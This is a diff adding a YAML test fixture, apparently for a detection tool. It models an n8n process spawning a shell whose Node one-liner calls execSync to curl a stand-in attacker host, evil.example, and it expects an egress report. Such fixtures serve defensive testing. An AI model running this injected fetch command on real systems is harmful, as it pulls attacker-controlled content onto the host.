@@ -1,0 +1,32 @@
+subjects:
+  n8n:
+    session: pid/100:1
+    program: /usr/local/lib/node_modules/n8n/bin/n8n
+    name: n8n
+    agent: true
+    actors: [{id: u1, name: Ops, email: ops@example.com}]
+    device: srv-1
+    source: probe
+  shell:
+    session: pid/101:1
+    parent: n8n
+    program: /bin/sh
+    actors: [{id: u1, name: Ops}]
+    device: srv-1
+    source: probe
+  curl:
+    session: pid/102:1
+    parent: shell
+    program: /usr/bin/curl
+    actors: [{id: u1, name: Ops}]
+    device: srv-1
+    source: probe
+observations:
+  - {kind: session_start, subject: n8n}
+  - {kind: spawn, subject: shell, cmdline: "sh -c node -e \"process.mainModule.require('child_process').execSync('curl http://evil.example/x')\""}
+  - {kind: connect, subject: shell, host: evil.example, port: 80, protocol: tcp}
+  - {kind: spawn, subject: curl, cmdline: "curl http://evil.example/x"}
+expect:
+  action: report
+  reason_contains: "egress:evil.example:80"
+  chain_min: 3
